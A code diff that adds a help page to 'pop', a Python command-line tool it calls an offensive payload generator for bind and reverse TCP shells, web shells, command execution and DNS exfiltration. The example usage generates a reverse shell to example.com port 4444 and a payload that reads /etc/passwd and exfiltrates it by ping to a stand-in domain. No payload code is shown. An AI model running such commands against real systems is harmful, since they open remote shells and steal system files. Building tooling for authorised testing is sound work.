@@ -35,20 +35,66 @@ def ls(name=None):
 
 
 def usage():
-    u = 'pop [-Ehl] [-e encoder[,...]] type module [arg...]'
+    u = 'pop [-EHhl] [-e encoder[,...]] type gen [arg...]'
     return 'usage: {}'.format(u)
+
+
+def manpage():
+    return '''
+
+  pop is an offensive payload generator designed for portability,
+  minimalism and efficiency.
+
+USAGE
+
+  {}
+
+  -E\tAdd example usage to output.
+  -H\tDisplay this help page.
+  -h\tDisplay a small usage line.
+  -l\tList generators and encoders.
+  -e\tA comma-separated list of encoders to use.
+    \t(not all encoders are supported by all languages)
+
+  type  The type of generators to use.
+
+              bt  Bind TCP shells
+              ns  DNS query generators (simple pokes)
+              rc  Remote command executions (simple)
+              rt  Reverse TCP shells
+              ws  Web shells
+              xd  DNS exfiltration payloads
+
+  gen   The specific generator to use.
+
+  [arg...]  Arguments to provide to the generator (if any).
+
+EXAMPLES
+
+  Generate a reverse TCP shell Python payload to connect back to
+  port 4444 on host example.com.
+
+    pop rt py example.com 4444
+
+  Generate a base64-encoded payload that runs "cat /etc/passwd" and
+  uses ping to exfiltrate the output to the unique.example.com domain.
+
+    pop -e b64 xd ping unique.example.com cat /etc/passwd
+    '''.format(usage())[1:]
 
 
 def main(args):
     from getopt import getopt, GetoptError
 
-    opts, args = getopt(args, 'Ee:hl')
+    opts, args = getopt(args, 'EHe:hl')
 
     o_encs = ''
     o_noex = True
     for k, v in opts:
         if '-E' == k:
             o_noex = False
+        elif '-H' == k:
+            return manpage()
         elif '-h' == k:
             return usage()
         elif '-l' == k:
